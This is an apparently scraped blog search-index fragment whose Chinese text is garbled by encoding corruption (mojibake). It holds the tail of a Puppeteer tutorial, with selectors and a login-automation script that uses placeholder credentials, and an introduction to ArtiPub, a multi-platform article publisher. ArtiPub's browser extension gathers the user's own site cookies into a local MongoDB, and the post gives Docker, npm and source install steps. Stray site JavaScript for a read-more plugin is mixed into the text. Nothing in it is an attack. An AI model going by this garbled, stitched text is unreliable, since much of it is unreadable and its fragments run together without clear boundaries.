è¯·å‹¿åœ¨å®‰è£…æ­¥éª¤ä¸­ä¸‹è½½ç»‘å®šçš„ Chromium PUPPETEER_DOWNLOAD_HOST - è¦†ç›–ç”¨äºä¸‹è½½ Chromium çš„ URL çš„ä¸»æœºéƒ¨åˆ† PUPPETEER_CHROMIUM_REVISION - åœ¨å®‰è£…æ­¥éª¤ä¸­æŒ‡å®šä¸€ä¸ª puppeteer ä½¿ç”¨çš„ç‰¹å®šç‰ˆæœ¬çš„ Chromium PUPPETEER_EXECUTABLE_PATH - æŒ‡å®šä¸€ä¸ª Chrome æˆ–è€… Chromium å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œä¼šè¢«ç”¨äº puppeteer.launch Puppeteer çš„é€‰æ‹©å™¨Puppeteer ä¸­è·å–å…ƒç´ çš„æ–¹æ³•å’Œæµè§ˆå™¨é‡Œé¢çš„ä¸€æ ·ï¼Œä½†æ˜¯è·å–å…ƒç´ çš„å±æ€§çš„åŠæ³•å’Œæµè§ˆå™¨ä¸ä¸€æ ·ï¼Œå®ƒæœ‰ä¸€å¥— API ç”¨æ¥è·å–ç•Œé¢ä¸­çš„å…ƒç´ ï¼Œè¿˜æœ‰ä¸€å¥— API ç”¨æ¥è·å–å…ƒç´ çš„å±æ€§ã€‚ è·å–å…ƒç´ çš„æ“ä½œå¦‚ä¸‹ï¼š 12345// Page.$(selector) è·å–å•ä¸ªå…ƒç´ ï¼Œåº•å±‚æ˜¯è°ƒç”¨çš„æ˜¯ document.querySelector()ï¼Œæ‰€ä»¥é€‰æ‹©å™¨çš„ selector æ ¼å¼éµå¾ª CSS é€‰æ‹©å™¨è§„èŒƒlet inputElement = await page.$(\'#search\');// Page.$$(selector) è·å–ä¸€ç»„å…ƒç´ ï¼Œåº•å±‚è°ƒç”¨çš„æ˜¯ document.querySelectorAll()ï¼Œè¿”å› Promise(Array(ElemetHandle)) å…ƒç´ æ•°ç»„const links = await page.$$("a"); è·å–å…ƒç´ çš„å±æ€§çš„æ“ä½œå¦‚ä¸‹ï¼š 1234567// Puppeteer è·å–å…ƒç´ å±æ€§è·Ÿå¹³æ—¶å†™ JavaScript çš„é€»è¾‘æœ‰ç‚¹ä¸ä¸€æ ·ï¼ŒæŒ‰ç…§é€šå¸¸çš„é€»è¾‘ï¼Œåº”è¯¥æ˜¯ç°è·å–å…ƒç´ ï¼Œç„¶åå†è·å–å…ƒç´ çš„å±æ€§// Puppeteer è·å–å…ƒç´ çš„ API æœ€ç»ˆè¿”å›çš„éƒ½æ˜¯ ElemetHandle å¯¹è±¡ï¼Œè€Œ ElemetHandle å¹¶æ²¡æœ‰æä¾›è·å–å…ƒç´ å±æ€§çš„ APIï¼Œè€Œ Puppeteer ä¸“é—¨æä¾›äº†ä¸€å¥—è·å–å…ƒç´ å±æ€§çš„ APIï¼Œåˆ†åˆ«æ˜¯ï¼š Page.$eval() å’Œ Page.$$eval()const href = await page.$eval(\'#a\', ele =&gt; ele.href);const content = await page.$eval(\'.content\', ele =&gt; ele.outerHTML);const value = await page.$eval(\'input[name=search]\', input =&gt; input.value);const textArray = await page.$$eval(\'#dom\', els =&gt; Array.from(els).map(el =&gt; el.textContent)); å¸¸ç”¨çš„å…ƒç´ é€‰æ‹©å™¨ï¼š é€‰æ‹©å™¨ ç¤ºä¾‹ ç¤ºä¾‹è¯´æ˜ id é€‰æ‹©å™¨ #id é€‰æ‹©åŒ¹é… id çš„å…ƒç´ ï¼Œä»…å­˜åœ¨ä¸€ä¸ª class é€‰æ‹©å™¨ .class åŒæ—¶åŒ¹é…å¤šä¸ª class å…ƒç´  å±æ€§é€‰æ‹©å™¨ div[attr] åŒ¹é…å…·æœ‰ attr çš„å±æ€§ï¼Œä¸è€ƒè™‘å…·ä½“çš„å€¼ å±æ€§é€‰æ‹©å™¨ div[attr=â€˜122â€˜] åŒ¹é…å…·æœ‰ attr çš„å±æ€§ï¼Œå€¼ä¸º 122 åä»£é€‰æ‹©å™¨ div span åä»£é€‰æ‹©å™¨ï¼ŒåŒ¹é…æ‰€æœ‰ div åé¢çš„ span æ ‡ç­¾ï¼Œdiv ä¸ span ä¹‹é—´ç”¨ç©ºæ ¼éš”å¼€ å­å…ƒç´ é€‰æ‹©å™¨ div &gt; span å­å…ƒç´ é€‰æ‹©å™¨ï¼ŒåŒ¹é… div åæ‰€æœ‰çš„ span åŒ¹é…çˆ¶å…ƒç´ ä¸‹çš„ç¬¬ n ä¸ªå­å…ƒç´  div:nth-child(2) åŒ¹é…çˆ¶å…ƒç´ ä¸‹çš„ç¬¬ 2 ä¸ªå…ƒç´  SegmentFault æ¨¡æ‹Ÿç™»å½•123456789101112131415161718192021222324252627const puppeteer = require(\'puppeteer\');(async () =&gt; { const browser = await puppeteer.launch({ executablePath: \'/usr/bin/google-chrome-stable\', headless: false }); const page = await browser.newPage(); page.setJavaScriptEnabled(true); page.setCacheEnabled(true); await page.goto("https://segmentfault.com/user/login", { "timeout" : 30000 }); // é€‰æ‹©ç™»å½•æ–¹å¼ await page.tap(".login-nav &gt; a[data-mode=\'password\']"); // è¾“å…¥ç”¨æˆ·å await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'username\']", \'admin\', {delay:100}); // è¾“å…¥å¯†ç  await page.type("form[class=\'password-form\'] &gt; div &gt; input[name=\'password\']", \'123456\', {delay:100}); // ç‚¹å‡»ç™»å½•æŒ‰é’® await page.tap("form[class=\'password-form\'] &gt; button[type=\'submit\']"); // await page.close(); // await browser.close();})(); Puppeteer ç»“åˆ Jest ä½¿ç”¨Puppeteer å‘¨è¾¹çš„å¼€æºé¡¹ç›® jvppeteerï¼ŒJava ç‰ˆçš„ Puppeteer pyppeteerï¼ŒPython ç‰ˆçš„ Puppeteer awesome-puppeteerï¼ŒPuppeteer ç›¸å…³çš„å¼€æºé¡¹ç›®æ•´ç† docker-puppeteerï¼ŒA minimal Docker image for Puppeteer puppeteer-clusterï¼ŒPuppeteer Pool, run a cluster of instances in parallel puppeteer-deepï¼Œçˆ¬å–ã€Šes6 æ ‡å‡†å…¥é—¨ã€‹ã€è‡ªåŠ¨æ¨æ–‡åˆ°æ˜é‡‘ã€ç«™ç‚¹æ€§èƒ½åˆ†æï¼›é«˜çº§çˆ¬è™«ã€è‡ªåŠ¨åŒ– UI æµ‹è¯•ã€æ€§èƒ½åˆ†æçš„å®è·µæ¡ˆä¾‹ puppeteer-recorderï¼ŒPuppeteer recorder is a Chrome extension that records your browser interactions and generates a Puppeteer script var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çˆ¬è™« å‰ç«¯"},{title:"ArtiPub ä¸€æ¬¾å¼€æºçš„ä¸€æ–‡å¤šå‘å¹³å°",url:"/posts/5987f4b4.html",text:'å‰è¨€å¾ˆå¤šä¼˜ç§€çš„ç¨‹åºå‘˜å’ŒæŠ€æœ¯äººå‘˜å–œæ¬¢å†™æŠ€æœ¯æ–‡ç« å’ŒæŠ€æœ¯åšå®¢ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼åˆ†äº«ä¼ æ’­çŸ¥è¯†å’Œç»éªŒï¼Œæ‰©å¤§è‡ªå·±çš„çŸ¥ååº¦å’Œå½±å“åŠ›ï¼Œå¸å¼•ç²‰ä¸å…³æ³¨ï¼Œç”šè‡³æœ‰äº›æŠ€æœ¯åšä¸»è¿˜é€šè¿‡å†™æ–‡ç« æ¥è·å–å¹¿å‘Šæ”¶å…¥ï¼Œè¿˜é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—äº†å‡ºç‰ˆä¹¦çš„æœºä¼šä»¥åŠå·¥ä½œæœºä¼šã€‚å› æ­¤ï¼Œå†™æŠ€æœ¯æ–‡ç« æ˜¯ä¸€ä»¶éå¸¸å€¼å¾—æŠ•å…¥çš„äº‹æƒ…ï¼Œå¸®åŠ©äº†è‡ªå·±ï¼Œä¹Ÿè®©å¤§ä¼—å—ç›Šã€‚ä½†æ˜¯ï¼Œå†™æŠ€æœ¯æ–‡ç« é€šå¸¸ä¹Ÿå¾ˆè€—æ—¶ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›ä¼˜è´¨æ–‡ç« ï¼Œä¸ä»…éœ€è¦æ—å¾åšå¼•ã€æ„æ€æ–‡ç« ç»“æ„ã€ç…§é¡¾è¯»è€…å—ä¼—ï¼Œè¿˜éœ€è¦åšå¾ˆå¤šå‰æœŸå·¥ä½œï¼Œä¾‹å¦‚æ­å»ºç¯å¢ƒã€å†™ Demo ä»£ç ã€æµ‹è¯•ä»£ç ç­‰ç­‰ã€‚ä¸€ç¯‡ä¼˜è´¨æŠ€æœ¯æ–‡ç« é€šå¸¸éœ€è¦ 3-6 ä¸ªå°æ—¶æ¥å®Œæˆï¼Œå¯èŠ±äº†å¾ˆå¤šæ—¶é—´æ¥å†™æ–‡ç« ï¼Œæœ€ç»ˆå‘å¸ƒå‡ºæ¥çš„æ–‡ç« å¾—ä¸åˆ°å¾ˆå¤šäººçš„å…³æ³¨æ˜¯ä¸€ä»¶ç›¸å½“ä»¤äººæ²®ä¸§çš„äº‹æƒ…ã€‚å› æ­¤ï¼Œä¼˜è´¨æ–‡ç« å€¼å¾—è·å–å…³æ³¨å’Œä¼ æ’­ï¼Œè®©æ›´å¤šçš„æŠ€æœ¯å·¥ä½œè€…é€šè¿‡é˜…è¯»æ–‡ç« è·å–çŸ¥è¯†è·ç›Šã€‚æ¯ä¸ªæŠ€æœ¯åšä¸»éƒ½æœ‰è‡ªå·±å–œæ¬¢çš„æŠ€æœ¯åª’ä½“å¹³å°ï¼Œä¾‹å¦‚ç®€ä¹¦ã€çŸ¥ä¹ã€æ˜é‡‘ã€CSDNã€å¾®ä¿¡å…¬ä¼—å·ç­‰ç­‰ã€‚å¾ˆå¤šæŠ€æœ¯åšä¸»ä¹Ÿå–œæ¬¢å°†æ–‡ç« å‘å¸ƒåœ¨ä¸åŒçš„å¹³å°ä¸Šï¼Œå¯»æ±‚æœ€å¤§çš„å…³æ³¨åº¦ï¼ŒåŒæ—¶ä¹Ÿé˜²æ­¢è‡ªå·±è¾›è¾›è‹¦è‹¦å†™çš„æ–‡ç« è¢«åˆ«äººå¤åˆ¶ç²˜è´´ç›—ç‰ˆè¿‡å»ã€‚ç„¶è€Œï¼Œåœ¨å¤šä¸ªå¹³å°ä¸Šå‘æ–‡æ˜¯ä¸€ä»¶éº»çƒ¦çš„äº‹æƒ…ï¼šåšä¸»éœ€è¦åŒæ—¶ç™»é™†å¤šä¸ªåª’ä½“å¹³å°ï¼Œå°†è‡ªå·±çš„æ–‡ç« å¤åˆ¶ä¸€ä¸ªä¸€ä¸ªç²˜è´´è¿‡å»ï¼›æ›´éº»çƒ¦çš„æ˜¯ï¼Œæœ‰äº›å¹³å°åªæ”¯æŒ Markdownï¼Œæœ‰äº›å¹³å°åªæ”¯æŒå¯Œæ–‡æœ¬ï¼Œåšä¸»éœ€è¦åœ¨è¿™ä¸¤è€…ä¹‹é—´æ¥å›è½¬æ¢ï¼Œè¿™å¢åŠ äº†å·¥ä½œé‡ã€‚ä¸€æ–‡å¤šå‘å¹³å° ArtiPub å°±è§£å†³äº†è¿™æ ·çš„é—®é¢˜ï¼Œä¸‹é¢å°†ä»‹ç»å¼€æºçš„ä¸€æ–‡å¤šå‘å¹³å° ArtiPubã€‚ ArtiPub ç®€ä»‹ArtiPubï¼ˆArticle Publisher çš„ç®€ç§°ï¼Œæ„ä¸ºâ€ æ–‡ç« å‘å¸ƒè€…â€ï¼‰æ˜¯ä¸€æ¬¾å¼€æºçš„ä¸€æ–‡å¤šå‘å¹³å°ï¼Œå¯ä»¥å¸®åŠ©æ–‡ç« ä½œè€…å°†ç¼–å†™å¥½çš„æ–‡ç« è‡ªåŠ¨å‘å¸ƒåˆ°ç®€ä¹¦ã€æ˜é‡‘ã€SegmentFaultã€CSDNã€çŸ¥ä¹ã€å¼€æºä¸­å›½ç­‰æŠ€æœ¯åª’ä½“å¹³å°ï¼Œä¼ æ’­ä¼˜è´¨çŸ¥è¯†ï¼Œè·å–æœ€å¤§çš„æ›å…‰åº¦ã€‚ArtiPub å®‰è£…ç®€å•ï¼Œæä¾›äº†å¤šç§å®‰è£…æ–¹å¼ï¼ˆDockerã€NPMã€æºç ï¼‰ï¼Œå¯ä»¥ä¸€é”®å®‰è£…ä½¿ç”¨ï¼Œå®‰è£…ä¸€èˆ¬åªè¦ 5 åˆ†é’Ÿã€‚ArtiPub ç›®å‰æ”¯æŒæ–‡ç« ç¼–è¾‘ã€æ–‡ç« å‘å¸ƒã€æ•°æ®ç»Ÿè®¡çš„åŠŸèƒ½ï¼ŒåæœŸä¼šåŠ å…¥å­˜é‡æ–‡ç« å¯¼å…¥ã€æ•°æ®åˆ†æçš„åŠŸèƒ½ã€‚æ­¤å¤–ï¼ŒArtiPub æ—¥åè¿˜ä¼šæ¥å…¥æ›´å¤šåª’ä½“æ¸ é“ï¼ŒçœŸæ­£åšåˆ°è®©æ–‡ç« éšå¤„å¯é˜…ã€‚ç”¨æˆ·ä½¿ç”¨ ArtiPub ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦åœ¨æµè§ˆå™¨ä¸Šæ‰“å¼€ ArtiPub çš„ Web ç•Œé¢ï¼Œå°†æ–‡ç« ä»¥ Markdown çš„å½¢å¼è¾“å…¥åˆ°ç¼–è¾‘å™¨ï¼Œç„¶åç‚¹å‡»ä¸€é”®å‘å¸ƒï¼Œç­‰å¾…ä¸åˆ° 1 åˆ†é’Ÿï¼Œæ–‡ç« å°±è‡ªåŠ¨åŒæ­¥åˆ°å„å¤§æŠ€æœ¯åª’ä½“å¹³å°äº†ã€‚æ­¤å¤–ï¼Œæ–‡ç« çš„é˜…è¯»ã€ç‚¹èµã€è¯„è®ºæ•°æ®è¿˜å°†å‘¨æœŸæ€§çš„è¢«åŒæ­¥å›æ¥ï¼Œè®©ä½œè€…å¯ä»¥è¿‘å®æ—¶çœ‹åˆ°æ–‡ç« çš„ä¼ æ’­æƒ…å†µã€‚ ArtiPub åŸç†ç®€ä»‹ArtiPub çš„åº•å±‚åŸç†å¹¶ä¸å¤æ‚ï¼Œç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨äº†çˆ¬è™«æŠ€æœ¯å°†æ–‡ç« å‘å¸ƒåˆ°å„å¤§å¹³å°ã€‚ArtiPub çš„çˆ¬è™«æ˜¯ç”¨äº† Google å¼€æºçš„è‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…· Puppeteerï¼Œè¿™ä¸ªå·¥å…·ä¸ä»…å¯ä»¥è·å–éœ€è¦æœ‰ ajax åŠ¨æ€å†…å®¹çš„æ•°æ®ï¼Œè¿˜å¯ä»¥æ¥åšä¸€äº›æ¨¡æ‹Ÿæ“ä½œï¼Œä½œç”¨ç±»ä¼¼äº Seleniumï¼Œä½†æ›´å¼ºå¤§ã€‚å¦‚ä½•è¿›è¡Œç™»é™†æ“ä½œå‘¢ï¼Ÿå…¶å® ArtiPub æ˜¯é€šè¿‡ Chrome æ’ä»¶è·å–äº†ç”¨æˆ·ç™»é™†ä¿¡æ¯ï¼ˆCookieï¼‰ï¼Œå°† Cookie æ³¨å…¥åˆ°ç”± Puppeteer æ“ä½œçš„ Chromium æµè§ˆå™¨ä¸­ï¼Œç„¶åæµè§ˆå™¨å°±å¯ä»¥æ­£å¸¸ç™»é™†ç½‘ç«™è¿›è¡Œå‘æ–‡æ“ä½œäº†ã€‚Cookie æ˜¯ä¿å­˜åœ¨ç”¨æˆ·è‡ªå·±æ­å»ºçš„ MongoDB æ•°æ®åº“é‡Œï¼Œä¸å¯¹å¤–æš´éœ²ï¼Œå› æ­¤å¾ˆå®‰å…¨ã€‚ ArtiPub çš„æ¶æ„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š æ¶æ„åŸç†ç®€ä»‹å¦‚ä¸‹ï¼š åç«¯ï¼ˆBackendï¼‰æ˜¯æ•´ä¸ªæ¶æ„çš„ä¸­æ¢ï¼Œè´Ÿè´£ç»™å‰ç«¯äº¤æ¢æ•°æ®ã€å‚¨å­˜è¯»å–æ•°æ®åº“ã€æ§åˆ¶çˆ¬è™«ã€æ”¶é›† Cookie ç­‰ Chrome æ’ä»¶ï¼ˆChrome Extensionï¼‰åªè´Ÿè´£ä»ç½‘ç«™ï¼ˆSitesï¼‰è·å– Cookie çˆ¬è™«ï¼ˆSpidersï¼‰è¢«åç«¯æ§åˆ¶ï¼Œè´Ÿè´£åœ¨ç½‘ç«™ä¸Šå‘å¸ƒæ–‡ç« å’ŒæŠ“å–æ•°æ® æ•°æ®åº“ï¼ˆMongoDBï¼‰è´Ÿè´£å‚¨å­˜æ•°æ®ï¼ˆCookieï¼‰ å‰ç«¯ï¼ˆFrontendï¼‰æ˜¯ä¸€ä¸ª React åº”ç”¨ï¼ŒåŸºäº Ant Design Pro æ”¹é€ è€Œæ¥ ArtiPub æ”¯æŒçš„å¹³å° æ˜é‡‘ SegmentFault CSDN ç®€ä¹¦ çŸ¥ä¹ å¼€æºä¸­å›½ ä»Šæ—¥å¤´æ¡ åšå®¢å›­ å¾®åš ç™¾åº¦ç™¾å®¶å· 51CTO å¼€å‘è€…å¤´æ¡ å¾®ä¿¡å…¬ä¼—å· ArtiPub ä¸å…¶ä»–å¹³å°æ¯”è¾ƒå¸‚é¢ä¸Šå·²ç»å­˜åœ¨ä¸€æ–‡å¤šå‘çš„å•†ä¸šå¹³å°äº†ï¼Œä¸ºä½•è¿˜è¦åˆ›å»º ArtiPub å‘¢ï¼Ÿæˆ–è®¸å…¶ä»–ä¸€æ–‡å¤šå‘å¹³å°ä¹Ÿæ˜¯ä¸€ä¸ªæ›¿ä»£æ–¹æ¡ˆï¼Œä½†å®ƒä»¬è¦æ±‚ç”¨æˆ·å°†è‡ªå·±çš„è´¦æˆ·ä¿¡æ¯ï¼Œä¾‹å¦‚ Cookie æˆ–è´¦å·å¯†ç ä¸Šä¼ åˆ°å¯¹æ–¹æœåŠ¡å™¨ï¼Œè¿™å¾ˆä¸å®‰å…¨ï¼Œä¸€æ—¦å¹³å°å‘ç”Ÿé—®é¢˜ï¼Œè‡ªå·±çš„è´¦æˆ·ä¿¡æ¯ä¼šé­åˆ°æ³„æ¼ã€‚è™½ç„¶ä¸€èˆ¬çš„å¹³å°ä¸ä¼šæ¶æ„æ“ä½œç”¨æˆ·çš„è´¦æˆ·ï¼Œä½†å¦‚æœå‡ºç°è¯¯æ“ä½œæˆ–è€…é»‘å®¢æ”»å‡»ï¼Œç”¨æˆ·çš„è´¦æˆ·ä¿¡æ¯å°†é­åˆ°æ³„æ¼ï¼Œå¹³å°ä¸Šçš„è´¢äº§ä¹Ÿå¯èƒ½é­åˆ°æŸåã€‚ArtiPub ä¸è¦æ±‚ç”¨æˆ·ä¸Šä¼ è´¦æˆ·ä¿¡æ¯ï¼Œæ‰€æœ‰è´¦æˆ·ä¿¡æ¯å…¨éƒ¨ä¿å­˜åœ¨ç”¨æˆ·è‡ªå·±çš„æ•°æ®åº“é‡Œï¼Œå› æ­¤è§„é¿äº†è¿™ä¸ªå®‰å…¨é£é™©ã€‚å¦å¤–ï¼Œç”±äº ArtiPub æ˜¯åŸºäº JS å¼€æºçš„ï¼ŒJS æºç ä¹Ÿæ¯”è¾ƒæ˜“äºç†è§£ï¼Œå¯æ‰©å±•æ€§å¾ˆå¼ºï¼Œç”¨æˆ·å¦‚æœæœ‰å…¶ä»–å¹³å°çš„æ¥å…¥éœ€æ±‚ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡æ›´æ”¹æºç æ¥å®ç°è‡ªå·±çš„éœ€æ±‚ï¼Œä¸ç”¨ç­‰å¾…å¹³å°æ›´æ–°ã€‚å®˜æ–¹çš„å¼€å‘ç»„ä¹Ÿå°†æŒç»­å¼€å‘ ArtiPubï¼Œå°†å…¶æ‰“é€ å¾—æ›´å®ç”¨å’Œæ˜“ç”¨ã€‚ ArtiPub å®‰è£…Docker å®‰è£… ArtiPub è½¯ä»¶ä¾èµ– è½¯ä»¶ç‰ˆæœ¬ Docker 18.03 Docker Compose 1.24.1 é€šè¿‡ Dockerï¼Œå¯ä»¥å…å»æ‰‹åŠ¨å®‰è£… MongoDB çš„æ­¥éª¤ï¼Œè¿™æ˜¯æœ€æ¨èçš„å®‰è£…æ–¹å¼ã€‚ä½¿ç”¨ Docker å®‰è£… ArtiPub å‰ï¼Œè¯·ç¡®ä¿å·²å®‰è£…å¥½ Docker ä»¥åŠ Docker Composeã€‚åœ¨é¡¹ç›®ç›®å½•ä¸‹åˆ›å»º docker-compose.yml æ–‡ä»¶ï¼Œè¾“å…¥å¦‚ä¸‹å†…å®¹ï¼š 1234567891011121314151617181920version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" # åç«¯æœåŠ¡çš„APIåœ°å€ï¼Œå¦‚æœåç«¯æœåŠ¡ä¸æ˜¯å®‰è£…åœ¨æœ¬æœºï¼Œè¯·ä¿®æ”¹ä¸ºåè®® + æœåŠ¡å™¨ IP åœ°å€ + ç«¯å£å·ï¼ˆé»˜è®¤ç«¯å£ä¸º 3000ï¼‰ ports: - "8000:8000" # å‰ç«¯æœåŠ¡ - "3000:3000" # åç«¯æœåŠ¡ depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" ç”±äº ArtiPub é‡‡ç”¨äº†å‰åç«¯åˆ†ç¦»çš„æ¶æ„ï¼Œå‰ç«¯ä½¿ç”¨ Nginx ä½œä¸º Web æœåŠ¡å™¨ï¼Œå¦‚æœéœ€è¦å¯¹ Nginx è¿›è¡Œé…ç½®ï¼ˆä¾‹å¦‚é…ç½®è·¨åŸŸï¼‰ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æ•°æ®å·æ¥æŒ‚è½½ Nginx çš„é…ç½®æ–‡ä»¶åˆ° ArtiPub çš„å®¹å™¨å†…ï¼ŒArtiPub çš„ Nginx é…ç½®æ–‡ä»¶è·¯å¾„ä¸ºï¼š/etc/nginx/conf.d/artipub.confï¼š 12345678910111213141516171819202122version: \'3.3\'services: app: image: "tikazyq/artipub:latest" container_name: "artipub-server" environment: MONGO_HOST: "mongo" ARTIPUB_API_ADDRESS: "http://localhost:3000" ports: - "8000:8000" - "3000:3000" depends_on: - mongo mongo: image: mongo:latest container_name: "artipub-mongo" restart: always ports: - "27017:27017" volumes: - \'/usr/local/docker-volumes/artipub/artipub.conf:/etc/nginx/conf.d/artipub.conf\' åˆ›å»ºå¹¶å¯åŠ¨ ArtiPub çš„å®¹å™¨ï¼Œå¯åŠ¨å®Œæˆååœ¨æµè§ˆå™¨ä¸­è®¿é—® http://127.0.0.1:8000ï¼Œå¯ä»¥çœ‹åˆ° Web ç®¡ç†ç•Œé¢ï¼š 12345# åå°å¯åŠ¨# docker-compose up -d# æŸ¥çœ‹è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯# docker logs artipub-server --tail 100 -f MongoDB æ•°æ®åº“ç®¡ç†å‘½ä»¤ï¼š 1234567891011# ç™»å½•MongoDB# docker exec -it artipub-mongo mongo# æ˜¾ç¤ºæ‰€æœ‰æ•°æ®åº“&gt; show dbs# åˆ‡æ¢æ•°æ®åº“&gt; use artipub# æŸ¥çœ‹æ•°æ®åº“çš„æ‰€æœ‰é›†åˆ&gt; show collections NPM åŒ…å®‰è£… ArtiPub è½¯ä»¶ä¾èµ– è½¯ä»¶ç‰ˆæœ¬ NodeJS 8.12+ MongoDB 3.6+ 123456789101112131415# æç¤ºï¼šé€šè¿‡ NPM åŒ…å®‰è£… ArtiPubï¼Œéœ€è¦æå‰æ‰‹åŠ¨å®‰è£…å¥½ MongoDB# å®‰è£…# npm install -g artipub# æˆ–è€…æŒ‡å®šé•œåƒæºæ¥å®‰è£…ï¼ŒåŠ å¿«ä¸‹è½½é€Ÿåº¦# npm install -g artipub --registry=https://registry.npm.taobao.org# å¯åŠ¨# artipub start# é»˜è®¤ä¼šä½¿ç”¨ "127.0.0.1:27017/artipub" ä½œä¸ºMongoDBçš„æ•°æ®åº“é“¾æ¥ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥é…ç½®æ•°æ®åº“ä¿¡æ¯ç­‰# artipub -h# æˆåŠŸå¯åŠ¨åï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® `http://127.0.0.1:8000`ï¼Œå¯ä»¥çœ‹åˆ° Web ç®¡ç†ç•Œé¢ æºç å®‰è£… ArtiPub123456789101112131415161718192021222324# æç¤ºï¼šé€šè¿‡æºç å®‰è£… ArtiPubï¼Œéœ€è¦æå‰æ‰‹åŠ¨å®‰è£…å¥½ MongoDB# å…‹éš†æºç # git clone https://github.com/crawlab-team/artipub# è¿›å…¥æºç ç›®å½•# cd artipub# å®‰è£…# npm install# é…ç½®æ•°æ®åº“# vim ./config.js# é…ç½®åç«¯æœåŠ¡çš„APIåœ°å€# vim ./src/config/config.ts # å°† apiEndpoint æ”¹æˆå¯¹åº”çš„ IP åœ°å€ + ç«¯å£ã€‚# å¯åŠ¨å‰ç«¯æœåŠ¡# npm run start:frontend# å¯åŠ¨åç«¯æœåŠ¡# npm run start:backend# æˆåŠŸå¯åŠ¨åï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—® `http://127.0.0.1:8000`ï¼Œå¯ä»¥çœ‹åˆ° Web ç®¡ç†ç•Œé¢ ArtiPub ç™»å½•åŠ©æ‰‹çš„ä½¿ç”¨ArtiPub éœ€è¦ä¾èµ–ç™»å½•åŠ©æ‰‹ï¼ˆChrome æµè§ˆå™¨æ’ä»¶ï¼‰æ¥è·å–ç”¨æˆ·åœ¨å„ä¸ªå¹³å°çš„è´¦å·ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨å®‰è£…ç™»å½•åŠ©æ‰‹æ’ä»¶ã€‚ArtiPub æˆåŠŸå¯åŠ¨åï¼Œé€šè¿‡ http://127.0.0.1:8000 è®¿é—® Web ç®¡ç†ç•Œé¢ï¼Œç‚¹å‡»é¡µé¢ä¸Šçš„ â€œç™»å½•åŠ©æ‰‹â€ èœå•é¡¹ï¼Œç„¶åæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤å®‰è£…æ’ä»¶ï¼š ç‚¹å‡»â€ ä¸‹è½½ç™»é™†åŠ©æ‰‹â€ï¼Œä¿å­˜æ–‡ä»¶åä¸º artipub-helper.zip åœ¨ Chrome æµè§ˆå™¨ä¸­è¾“å…¥ chrome://extensionsï¼Œå¹¶å¼€å¯å¼€å‘è€…æ¨¡å¼ï¼ˆç‚¹å‡»å³ä¸Šè§’ï¼‰ å°†ä¸‹è½½çš„ç™»é™†åŠ©æ‰‹æ–‡ä»¶ artipub-helper.zip æ‹–å…¥æµè§ˆå™¨ä¸­ï¼Œæµè§ˆå™¨å°†è‡ªåŠ¨å®‰è£…æ’ä»¶ï¼ˆå¦‚æœä¸èƒ½æ‹–æ‹½ï¼Œè¯·åˆ·æ–°é¡µé¢åé‡è¯•ï¼‰ åœ¨ä½¿ç”¨ç™»é™†åŠ©æ‰‹ä¹‹å‰ï¼Œè¯·ç¡®ä¿å„ä¸ªå¹³å°çš„è´¦å·å·²ç»å¤„äºç™»é™†çŠ¶æ€ æµè§ˆå™¨å³ä¸Šè§’ç‚¹å‡»å®‰è£…å¥½çš„æ’ä»¶å›¾æ ‡ï¼Œç‚¹å‡»â€ ä¸€é”®è·å–ç™»é™†ä¿¡æ¯â€ï¼Œæ’ä»¶å°†è·å–æ‰€æœ‰å¹³å°çš„ Cookie æ³¨æ„ï¼šå¦‚æœ ArtiPub çš„åç«¯æœåŠ¡æ²¡æœ‰éƒ¨ç½²åœ¨æœ¬æœºï¼Œè¯·ç‚¹å‡»æµè§ˆå™¨å³ä¸Šè§’çš„ç™»å½•åŠ©æ‰‹é‡Œçš„â€ æ‰³æ‰‹â€ æŒ‰é’®ï¼Œè¾“å…¥åç«¯æœåŠ¡çš„ IP åœ°å€ + ç«¯å£å·ï¼ˆé»˜è®¤ 3000ï¼‰ï¼Œç„¶åå†è·å–ç™»é™†ä¿¡æ¯ åˆ°â€ å¹³å°ç®¡ç†â€ é¡µé¢ï¼Œç‚¹å‡»â€ æ›´æ–° Cookie çŠ¶æ€â€ï¼ˆéœ€è¦å¤§çº¦ 1 åˆ†é’Ÿï¼‰ï¼Œç„¶åæŸ¥çœ‹ â€œCookie çŠ¶æ€â€ï¼Œç¡®ä¿å…¶ä¸ºâ€ å·²å¯¼å…¥â€ çŠ¶æ€ åˆ°â€ æ–‡ç« ç®¡ç†â€ é¡µé¢ï¼Œç‚¹å‡»â€ å‘å¸ƒâ€ï¼Œé€‰æ‹©ç™»é™†æ–¹å¼ä¸º â€œCookieâ€ï¼Œç„¶åå‘å¸ƒæ–‡ç«  ArtiPub ç•Œé¢å¹³å°ç®¡ç†ç•Œé¢ æ–‡ç« ç®¡ç†ç•Œé¢ æ–‡ç« å‘å¸ƒç•Œé¢ 